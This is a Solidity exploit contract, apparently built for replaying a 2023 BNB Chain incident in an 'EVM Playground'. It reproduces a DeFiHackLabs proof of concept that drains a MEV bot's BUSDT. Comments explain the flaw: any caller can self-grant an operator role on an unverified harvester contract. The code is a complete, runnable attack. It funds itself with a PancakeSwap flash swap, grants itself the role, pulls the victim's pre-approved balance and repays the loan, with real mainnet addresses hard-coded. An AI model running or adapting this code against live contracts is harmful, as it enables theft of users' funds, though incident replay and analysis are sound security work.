// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-11-MEV_0x8c2d).
//
// The DeFiHackLabs PoC runs the attack as a PancakeSwap V2 flash-swap where the
// Foundry test contract itself is the borrower (it implements the `pancakeCall`
// callback). The replay engine (@ethereumjs/vm) executes zero Foundry
// cheatcodes, so this is a faithful, cheatcode-free copy of the inline attack
// from test/MEV_0x8c2d_exp.sol — same constants, same raw calldata layout for
// the two unverified selectors, same repay math.
//
// Root cause (both target contracts are unverified on BscScan — reconstructed
// from the live call trace + storage diffs, see MEV_0x8c2d_exp.md):
// `assetHarvestingContract` (0x19a2…) lets ANY caller self-designate a
// privileged "operator" role via selector 0xac3994ec — there is no owner /
// authority check, the caller simply writes its own address into the role
// slot. Selector 0x1270d364 then lets whoever currently holds that
// self-granted role pull an arbitrary `from` owner's balance of a token via
// `transferFrom(from, to, amount)`. The victim MEV bot had pre-approved the
// harvester for `type(uint256).max` BUSDT (to let an off-chain keeper sweep
// its profits), so self-granting the role is all it takes to drain it. The
// PancakeSwap flash swap is only a zero-capital funding vehicle — it plays no
// role in the authorization break itself and is fully repaid + the 0.25% pool
// fee at the end of the callback.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract MEV0x8c2dDrain {
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakePair constant WBNB_BUSDT = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    address constant victimMevBot = 0x8C2D4ed92Badb9b65f278EfB8b440F4BC995fFe7;
    address constant assetHarvestingContract = 0x19a23DdAA47396335894229E0439D3D187D89eC9;

    // Entry point: flash-borrow exactly the victim's current BUSDT balance from
    // the WBNB/BUSDT pair. `to = address(this)` plus non-empty `data` makes the
    // pair call back into `pancakeCall` below before it checks the K-invariant.
    function run() public {
        bytes memory data = abi.encode(assetHarvestingContract, victimMevBot);
        WBNB_BUSDT.swap(BUSDT.balanceOf(victimMevBot), 0, address(this), data);
    }

    // PancakeSwap V2 flash-swap callback — this is where the real exploit runs.
    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        BUSDT.approve(assetHarvestingContract, type(uint256).max);

        uint256 currentTimePlusOne = block.timestamp + 1;
        uint256 chainId;
        assembly {
            chainId := chainid()
        }

        // Self-grant a privileged "operator" role on the harvester — this is
        // the vulnerability: no owner/authority check gates who may name
        // themselves privileged.
        designateRole(currentTimePlusOne, chainId);
        // Use the just-self-granted role to pull the victim's pre-approved
        // BUSDT: transferFrom(victim, this, victim's whole balance).
        harvestAssets(currentTimePlusOne, chainId);

        BUSDT.approve(assetHarvestingContract, 0);

        // Repay the flash swap plus PancakeSwap's 0.25% fee.
        uint256 repayAmount = 1 + (3 * amount0) / 997 + amount0;
        BUSDT.transfer(address(WBNB_BUSDT), repayAmount);
    }

    function designateRole(uint256 time, uint256 chain) internal {
        (bool success, ) = assetHarvestingContract.call(
            abi.encodeWithSelector(
                bytes4(0xac3994ec),
                BUSDT.balanceOf(address(this)),
                uint8(0),
                (time << 96) | ((chain << 64) & 0xffffffff0000000000000000),
                uint8(0),
                address(BUSDT),
                uint8(0),
                uint8(0),
                address(this)
            )
        );
        require(success, "designateRole failed");
    }

    function harvestAssets(uint256 time, uint256 chain) internal {
        (bool success, ) = assetHarvestingContract.call(
            abi.encodeWithSelector(
                bytes4(0x1270d364),
                BUSDT.balanceOf(address(this)),
                uint8(0),
                (time << 96) | ((chain << 64) & 0xffffffff0000000000000000),
                uint8(0),
                address(BUSDT),
                uint8(0),
                uint8(0),
                victimMevBot,
                address(this),
                uint8(0)
            )
        );
        require(success, "harvestAssets failed");
    }
}
